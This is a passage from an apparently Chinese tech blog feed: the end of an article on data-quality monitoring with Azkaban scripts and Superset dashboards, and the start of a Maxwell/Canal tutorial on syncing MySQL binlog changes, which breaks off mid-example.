class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> azclient <span class="keyword">import</span> login,wait_node,get_exec_id</span><br><span class="line"><span class="keyword">from</span> check_notification <span class="keyword">import</span> get_yesterday</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ods</span><span class="params">(dt, session_id, exec_id)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    检查ODS层数据质量</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param dt: 日期</span></span><br><span class="line"><span class="string">    :param session_id: 和azkaban通讯的session_id</span></span><br><span class="line"><span class="string">    :param exec_id: 指定的执行ID</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> wait_node(session_id, exec_id, <span class="string">"hdfs_to_ods_db"</span>) <span class="keyword">and</span> wait_node(session_id, exec_id, <span class="string">"hdfs_to_ods_log"</span>):</span><br><span class="line">        os.system(<span class="string">"bash check_ods.sh "</span> + dt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    argv = sys.argv</span><br><span class="line">    <span class="comment"># 获取session_id</span></span><br><span class="line">    session_id = login()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取执行ID。只有在原Flow正在执行时才能获取</span></span><br><span class="line">    exec_id = get_exec_id(session_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日期，如果不存在取昨天</span></span><br><span class="line">    <span class="keyword">if</span> len(argv) &gt;= <span class="number">2</span>:</span><br><span class="line">        dt = argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dt = get_yesterday()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查各层数据质量</span></span><br><span class="line">    <span class="keyword">if</span> exec_id:</span><br><span class="line">        check_ods(dt, session_id, exec_id)</span><br></pre></td></tr></table></figure><p><strong>DWD层调度脚本</strong></p><p>该脚本用于检查DWD层数据质量。在Idea中创建一个文件check_dwd.py，在文件中编写如下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> azclient <span class="keyword">import</span> login, wait_node, get_exec_id</span><br><span class="line"><span class="keyword">from</span> check_notification <span class="keyword">import</span> get_yesterday</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_dwd</span><span class="params">(dt, session_id, exec_id)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    检查DWD层数据质量</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param dt: 日期</span></span><br><span class="line"><span class="string">    :param session_id: 和azkaban通讯的session_id</span></span><br><span class="line"><span class="string">    :param exec_id: 指定的执行ID</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> wait_node(session_id, exec_id, <span class="string">"ods_to_dwd_db"</span>) <span class="keyword">and</span> wait_node(session_id, exec_id, <span class="string">"ods_to_dwd_log"</span>):</span><br><span class="line">        os.system(<span class="string">"bash check_dwd.sh "</span> + dt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    argv = sys.argv</span><br><span class="line">    <span class="comment"># 获取session_id</span></span><br><span class="line">    session_id = login()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取执行ID。只有在原Flow正在执行时才能获取</span></span><br><span class="line">    exec_id = get_exec_id(session_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日期，如果不存在取昨天</span></span><br><span class="line">    <span class="keyword">if</span> len(argv) &gt;= <span class="number">2</span>:</span><br><span class="line">        dt = argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dt = get_yesterday()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查各层数据质量</span></span><br><span class="line">    <span class="keyword">if</span> exec_id:</span><br><span class="line">        check_dwd(dt, session_id, exec_id)</span><br></pre></td></tr></table></figure><p><strong>DIM层调度脚本</strong></p><p>该脚本用于检查DIM层数据质量。在Idea中创建一个文件check_dim.py，在文件中编写如下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> azclient <span class="keyword">import</span> login, wait_node, get_exec_id</span><br><span class="line"><span class="keyword">from</span> check_notification <span class="keyword">import</span> get_yesterday</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_dim</span><span class="params">(dt, session_id, exec_id)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    检查DIM层数据质量</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param dt: 日期</span></span><br><span class="line"><span class="string">    :param session_id: 和azkaban通讯的session_id</span></span><br><span class="line"><span class="string">    :param exec_id: 指定的执行ID</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> wait_node(session_id, exec_id, <span class="string">"ods_to_dim_db"</span>):</span><br><span class="line">        os.system(<span class="string">"bash check_dim.sh "</span> + dt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    argv = sys.argv</span><br><span class="line">    <span class="comment"># 获取session_id</span></span><br><span class="line">    session_id = login()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取执行ID。只有在原Flow正在执行时才能获取</span></span><br><span class="line">    exec_id = get_exec_id(session_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日期，如果不存在取昨天</span></span><br><span class="line">    <span class="keyword">if</span> len(argv) &gt;= <span class="number">2</span>:</span><br><span class="line">        dt = argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dt = get_yesterday()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查各层数据质量</span></span><br><span class="line">    <span class="keyword">if</span> exec_id:</span><br><span class="line">        check_dim(dt, session_id, exec_id)</span><br></pre></td></tr></table></figure><h3 id="6-2-Azkaban工作流配置文件">6.2 Azkaban工作流配置文件</h3><p>在Idea中创建一个文件azkaban.project，在文件中编写如下内容:<code>azkaban-flow-version: 2.0</code>;在Idea中创建一个文件data_supervisor.flow，在文件中编写如下内容： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">nodes:</span><br><span class="line">  - name: check_ods</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">     <span class="built_in">command</span>: python check_ods.py <span class="variable">$&#123;dt&#125;</span></span><br><span class="line"></span><br><span class="line">  - name: check_dwd</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">     <span class="built_in">command</span>: python check_dwd.py <span class="variable">$&#123;dt&#125;</span></span><br><span class="line"></span><br><span class="line">  - name: check_dim</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">     <span class="built_in">command</span>: python check_dim.py <span class="variable">$&#123;dt&#125;</span></span><br><span class="line">    </span><br><span class="line">  - name: check_notification</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    dependsOn:</span><br><span class="line">         - check_ods</span><br><span class="line">         - check_dwd</span><br><span class="line">         - check_dim</span><br><span class="line">    config:</span><br><span class="line">     <span class="built_in">command</span>: python check_notification.py <span class="variable">$&#123;alert&#125;</span> <span class="variable">$&#123;dt&#125;</span></span><br></pre></td></tr></table></figure><p>将所有文件打包成data_supervisor.zip文件，然后上传启动，填写参数运行</p><h2 id="7、可视化模块">7、可视化模块</h2><p>该模块的主要作用是对数据质量监控结果进行可视化展示。检测结果可以采用Superset进行可视化展示。具体配置步骤如下：</p><ul><li>在Superset中新建数据库连接：注：mysql://root:000000@hadoop102:3306/data_supervisor?charset=utf8</li><li>点击“Datasets”，然后点击“+Dataset”，将所有数据表格都导入为dataset</li><li>新建一个dashboard</li><li>新建一张图表并保存到dashboard，在chart页面中选择新建chart</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404161647182.png" alt></p><ul><li>所有监控的指标创建图表，并保存到dashboard</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、数据质量管理概述&lt;/h1&gt;
&lt;h2 id=&quot;1、数据质量管理定义&quot;&gt;1、数据质量管理定义&lt;/h2&gt;
&lt;p&gt;数据质量管理（Data Quality Management），是指对&lt;a href=&quot;https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE/5947370&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;数据&quot;&gt;数据&lt;/a&gt;从计划、获取、存储、共享、维护、应用、消亡生命周期的每个阶段里可能引发的各类数据质量问题，进行识别、度量、监控、预警等一系列管理活动，并通过改善和提高组织的管理水平使得&lt;a href=&quot;https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E8%B4%A8%E9%87%8F/5134536&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;数据质量&quot;&gt;数据质量&lt;/a&gt;获得进一步提高。&lt;/p&gt;
&lt;p&gt;数据质量管理是循环管理过程，其终极目标是通过可靠的数据提升数据在使用中的价值，并最终为企业赢得经济效益&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>实时数据同步之Maxwell和Canal</title>
    <link href="https://blog.shawncoding.top/posts/389d91c4.html"/>
    <id>https://blog.shawncoding.top/posts/389d91c4.html</id>
    <published>2024-05-31T08:23:45.000Z</published>
    <updated>2024-05-31T08:36:35.711Z</updated>
    
    <content type="html"><![CDATA[<h1>实时数据同步之Maxwell和Canal</h1><h1>一、概述</h1><h2 id="1、实时同步工具概述">1、实时同步工具概述</h2><h3 id="1-1-Maxwell-概述">1.1 Maxwell 概述</h3><blockquote><p>官网地址：<a href="https://maxwells-daemon.io/" target="_blank" rel="noopener" title="https://maxwells-daemon.io/">https://maxwells-daemon.io/</a></p></blockquote><p>Maxwell  是由美国  Zendesk  开源，用  Java  编写的  MySQL  实时抓取软件。 实时读取MySQL 二进制日志 Binlog，并生成 JSON格式的消息，作为生产者发送给  Kafka，Kinesis、RabbitMQ、Redis、Google Cloud Pub/Sub、文件或其它平台的应用程序</p><p><em>注意：1.30.0版本后不在支持JDK8</em></p><a id="more"></a><h3 id="1-2-Canal概述">1.2 Canal概述</h3><p>Canal 是用 Java 开发的基于数据库增量日志解析，提供增量数据订阅&amp;消费的中间件。目前。Canal 主要支持了 MySQL 的 Binlog 解析，解析完成后才利用 Canal Client 来处理获得的相关数据。（数据库同步需要阿里的 Otter 中间件，基于 Canal）</p><h2 id="2、数据同步工作原理">2、数据同步工作原理</h2><h3 id="2-1-MySQL-主从复制过程">2.1 MySQL 主从复制过程</h3><blockquote><p>具体可以参考：<a href="https://blog.csdn.net/lemon_TT/article/details/120201007" target="_blank" rel="noopener" title="ShardingSphere数据库中间件基础学习">ShardingSphere数据库中间件基础学习</a></p></blockquote><ul><li>Master 主库将改变记录，写到二进制日志(binary log)中</li><li>Slave 从库向 mysql  master 发送 dump 协议，将 master 主库的 binary  log  events 拷贝到它的中继日志(relay log)；</li><li>Slave 从库读取并重做中继日志中的事件，将改变的数据同步到自己的数据库</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404151825987.png" alt></p><h3 id="2-2-两种工具工作原理">2.2 两种工具工作原理</h3><p>就是把自己伪装成 Slave，假装从 Master 复制数据</p><h2 id="3、MySQL-的-binlog详解">3、MySQL 的 binlog详解</h2><h3 id="3-1-什么是-binlog">3.1 什么是 binlog</h3><p>MySQL 的二进制日志可以说 MySQL 最重要的日志了，它记录了所有的 DDL 和 DML(除了数据查询语句)语句，以事件形式记录，还包含语句所执行的消耗的时间，MySQL 的二进制日志是事务安全型的。一般来说开启二进制日志大概会有 1%的性能损耗。二进制有两个最重要的使用场景:</p><ul><li>MySQL Replication 在 Master 端开启 binlog，Master 把它的二进制日志传递给 slaves 来达到 master-slave 数据一致的目的</li><li>自然就是数据恢复了，通过使用 mysqlbinlog 工具来使恢复数据。二进制日志包括两类文件：二进制日志索引文件（文件名后缀为.index）用于记录所有的二进制文件，二进制日志文件（文件名后缀为.00000*）记录数据库所有的 DDL 和 DML(除了数据查询语句)语句事件</li></ul><h3 id="3-2-binlog-的开启">3.2 binlog 的开启</h3><ul><li>找到 MySQL 配置文件的位置</li><li>Linux: <code>/etc/my.cnf</code> 如果/etc 目录下没有，可以通过 <code>locate my.cnf</code> 查找位置</li><li>Windows: \my.ini</li><li>在 mysql 的配置文件下,修改配置在[mysqld]  区块，设置/添加  <code> log-bin=mysql-bin</code>这个表示 binlog 日志的前缀是 mysql-bin，以后生成的日志文件就是  mysql-bin.000001的文件后面的数字按顺序生成，每次 mysql 重启或者到达单个文件大小的阈值时，新生一个文件，按顺序编号</li></ul><h3 id="3-3-binlog-的分类设置">3.3 binlog 的分类设置</h3><p>mysql binlog 的格式有三种，分别是 STATEMENT,MIXED,ROW。在配置文件中可以选择配<strong>binlog_format=</strong> <strong>statement|mixed|row</strong>。<strong>Maxwell</strong> <strong>想做监控分析，选择</strong> <strong>row</strong> <strong>格式比较合适</strong></p><ul><li><p><strong>statement</strong></p><p>语句级，binlog 会记录每次一执行写操作的语句。相对 row 模式节省空间，但是可能产生不一致性，比如<code>update test set create_date=now();</code>如果用 binlog 日志进行恢复，由于执行时间不同可能产生的数据就不同。优点： 节省空间   缺点：  有可能造成数据不一致。</p></li><li><p><strong>row</strong></p><p>行级，  binlog 会记录每次操作后每行记录的变化。优点：保持数据的绝对一致性。因为不管 sql 是什么，引用了什么函数，他只记录执行后的效果。缺点：占用较大空间</p></li><li><p><strong>mixed</strong></p><p>混合级别，statement  的升级版，一定程度上解决了 statement 模式因为一些情况而造成的数据不一致问题。默认还是 statement，在某些情况下，譬如：当函数中包含  UUID()  时；包含  AUTO_INCREMENT  字段的表被更新时；执行  INSERT DELAYED  语句时；用  UDF  时；会按照  ROW 的方式进行处理  优点：节省空间，同时兼顾了一定的一致性。缺点：还有些极个别情况依旧会造成不一致，另外 statement 和 mixed 对于需要对binlog 监控的情况都不方便。</p></li></ul><h2 id="4、Maxwell和Canal对比">4、Maxwell和Canal对比</h2><table><thead><tr><th><strong>对比</strong></th><th><strong>Canal</strong></th><th><strong>Maxwell</strong></th></tr></thead><tbody><tr><td>语言</td><td>java</td><td>java</td></tr><tr><td>数据格式</td><td>格式自由</td><td>json</td></tr><tr><td>采集数据模式</td><td>增量</td><td>全量/增量</td></tr><tr><td>数据落地</td><td>定制</td><td>支持 kafka 等多种平台</td></tr><tr><td>HA</td><td>支持</td><td>支持</td></tr></tbody></table><h2 id="5、环境安装">5、环境安装</h2><blockquote><p>需要安装mysql，kafka，zookeeper，具体的可以参考之前的博客文章</p></blockquote><p>这里讲解开启mysql的binLog日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/my.cnf</span><br><span class="line"><span class="comment"># 在[mysqld]模块下添加一下内容</span></span><br><span class="line">[mysqld]</span><br><span class="line"><span class="comment"># 主机序列号，每台都要唯一</span></span><br><span class="line">server_id=1</span><br><span class="line"><span class="comment"># 前缀</span></span><br><span class="line"><span class="built_in">log</span>-bin=mysql-bin</span><br><span class="line">binlog_format=row</span><br><span class="line"><span class="comment"># 针对某个库，不加就是全部，多个库就弄多行</span></span><br><span class="line"><span class="comment">#binlog-do-db=test_maxwell</span></span><br><span class="line"><span class="comment"># binlog-do-db=test_maxwell2</span></span><br><span class="line"><span class="comment"># 这是canal测试</span></span><br><span class="line"><span class="comment">#binlog-do-db=gmall-2021</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 Mysql 服务</span></span><br><span class="line">sudo systemctl restart mysqld</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 登录 mysql 并查看是否修改完成</span></span><br><span class="line">mysql -uroot -p123456</span><br><span class="line">show variables like <span class="string">'%binlog%'</span>;</span><br><span class="line"><span class="comment"># 查看下列属性</span></span><br><span class="line">binlog_format | ROW</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入/var/lib/mysql 目录，查看 MySQL 生成的 binlog 文件</span></span><br><span class="line"><span class="built_in">cd</span> /var/lib/mysql</span><br><span class="line">sudo ls -l</span><br></pre></td></tr></table></figure><p>注：MySQL 生成的 binlog 文件初始大小一定是 154 字节，然后前缀是 log-bin 参数配置的，后缀是默从.000001，然后依次递增。除了 binlog 文件文件以外，MySQL 还会额外生产一个.index 索引文件用来记录当前使用的 binlog 文件</p><h1>二、Maxwell 使用</h1><h2 id="1、Maxwell-安装部署">1、Maxwell 安装部署</h2><h3 id="1-1-下载安装">1.1 下载安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为1.30开始不支持jdk8，所以用这个</span></span><br><span class="line">wget https://github.com/zendesk/maxwell/releases/download/v1.29.2/maxwell-1.29.2.tar.gz</span><br><span class="line">tar -zxvf maxwell-1.29.2.tar.gz -C /opt/module/</span><br></pre></td></tr></table></figure><h3 id="1-2-初始化-Maxwell-元数据库">1.2 初始化 Maxwell 元数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 MySQL 中建立一个 maxwell 库用于存储 Maxwell 的元数据</span></span><br><span class="line">mysql -uroot -p123456</span><br><span class="line">CREATE DATABASE maxwell;</span><br><span class="line"><span class="comment"># 设置 mysql 用户密码安全级别</span></span><br><span class="line"><span class="built_in">set</span> global validate_password_length=4;</span><br><span class="line"><span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line"><span class="comment"># 分配一个账号可以操作该数据库</span></span><br><span class="line">GRANT ALL ON maxwell.* TO <span class="string">'maxwell'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'123456'</span>;</span><br><span class="line"><span class="comment"># 分配这个账号可以监控其他数据库的权限</span></span><br><span class="line">GRANT SELECT,REPLICATION SLAVE,REPLICATION CLIENT ON *.* TO maxwell@<span class="string">'%'</span>;</span><br><span class="line"><span class="comment"># 刷新 mysql 表权限</span></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h3 id="1-3-Maxwell-进程启动">1.3 Maxwell 进程启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ============Maxwell 进程启动方式有如下两种========</span></span><br><span class="line"><span class="comment"># 1、使用命令行参数启动 Maxwell 进程</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/maxwell-1.29.2/</span><br><span class="line"><span class="comment"># --user  连接 mysql 的用户</span></span><br><span class="line"><span class="comment"># --password  连接 mysql 的用户的密码</span></span><br><span class="line"><span class="comment"># --host mysql 安装的主机名</span></span><br><span class="line"><span class="comment"># --producer  生产者模式(stdout：控制台 kafka：kafka 集群)</span></span><br><span class="line">bin/maxwell --user=<span class="string">'maxwell'</span> --password=<span class="string">'123456'</span> --host=<span class="string">'hadoop102'</span> --producer=stdout</span><br><span class="line"><span class="comment"># 2、修改配置文件，定制化启动 Maxwell 进程 </span></span><br><span class="line">cp config.properties.example config.properties</span><br><span class="line">vim config.properties</span><br><span class="line"><span class="comment"># 修改完成后</span></span><br><span class="line">bin/maxwell --config ./config.properties</span><br></pre></td></tr></table></figure><h2 id="2、Maxwell入门案例">2、Maxwell入门案例</h2><h3 id="2-1-监控-Mysql-数据并在控制台打印">2.1 监控 Mysql 数据并在控制台打印</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行 maxwell 来监控 mysql 数据更新</span></span><br><span class="line">bin/maxwell --user=<span class="string">'maxwell'</span> --password=<span class="string">'123456'</span> --host=<span class="string">'hadoop102'</span> --producer=stdout</span><br></pre></td></tr></table></figure><p>创建对应的mysql语句，查看控制台</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向 mysql 的 test_maxwell 库的 test 表插入一条数据，查看 maxwell 的控制台输出</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">test</span>  <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'aaa'</span>);</span><br><span class="line">&#123;</span><br><span class="line">    "database":"test_maxwell", <span class="comment">--库名</span></span><br><span class="line">    "table":"test", <span class="comment">--表名</span></span><br><span class="line">    "type":"<span class="keyword">insert</span><span class="string">", --数据更新类型</span></span><br><span class="line"><span class="string">    "</span>ts<span class="string">":1683960319, --操作时间</span></span><br><span class="line"><span class="string">    "</span>xid<span class="string">":4335, --操作 id</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">commit</span><span class="string">":true, --提交成功</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">data</span><span class="string">":&#123; --数据</span></span><br><span class="line"><span class="string">        "</span><span class="keyword">id</span><span class="string">":1,</span></span><br><span class="line"><span class="string">        "</span><span class="keyword">name</span><span class="string">":"</span>aaa<span class="string">"</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"># 向 mysql 的 test_maxwell 库的 test 表同时插入 3 条数据，控制台出现了 3 条 json日志，说明 maxwell 是以数据行为单位进行日志的采集的</span></span><br><span class="line"><span class="string">INSERT INTO  test VALUES(2,'bbb'),(3,'ccc'),(4,'ddd');</span></span><br><span class="line"><span class="string">&#123;"</span><span class="keyword">database</span><span class="string">":"</span>test_maxwell<span class="string">","</span><span class="keyword">table</span><span class="string">":"</span><span class="keyword">test</span><span class="string">","</span><span class="keyword">type</span><span class="string">":"</span><span class="keyword">insert</span><span class="string">","</span>ts<span class="string">":1683960373,"</span>xid<span class="string">":4666,"</span>xoffset<span class="string">":0,"</span><span class="keyword">data</span><span class="string">":&#123;"</span><span class="keyword">id</span><span class="string">":2,"</span><span class="keyword">name</span><span class="string">":"</span>bbb<span class="string">"&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;"</span><span class="keyword">database</span><span class="string">":"</span>test_maxwell<span class="string">","</span><span class="keyword">table</span><span class="string">":"</span><span class="keyword">test</span><span class="string">","</span><span class="keyword">type</span><span class="string">":"</span><span class="keyword">insert</span><span class="string">","</span>ts<span class="string">":1683960373,"</span>xid<span class="string">":4666,"</span>xoffset<span class="string">":1,"</span><span class="keyword">data</span><span class="string">":&#123;"</span><span class="keyword">id</span><span class="string">":3,"</span><span class="keyword">name</span><span class="string">":"</span>ccc<span class="string">"&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;"</span><span class="keyword">database</span><span class="string">":"</span>test_maxwell<span class="string">","</span><span class="keyword">table</span><span class="string">":"</span><span class="keyword">test</span><span class="string">","</span><span class="keyword">type</span><span class="string">":"</span><span class="keyword">insert</span><span class="string">","</span>ts<span class="string">":1683960373,"</span>xid<span class="string">":4666,"</span><span class="keyword">commit</span><span class="string">":true,"</span><span class="keyword">data</span><span class="string">":&#123;"</span><span class="keyword">id</span><span class="string">":4,"</span><span class="keyword">name</span><span class="string">":"</span>ddd<span class="string">"&#125;&#125;</span></span><br><span class="line"><span class="string">update test set name='shawn' where id=1;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">database</span><span class="string">":"</span>test_maxwell<span class="string">",</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">table</span><span class="string">":"</span><span class="keyword">test</span><span class="string">",</span></span><br><span class="line"><span class="string">    "</span><span 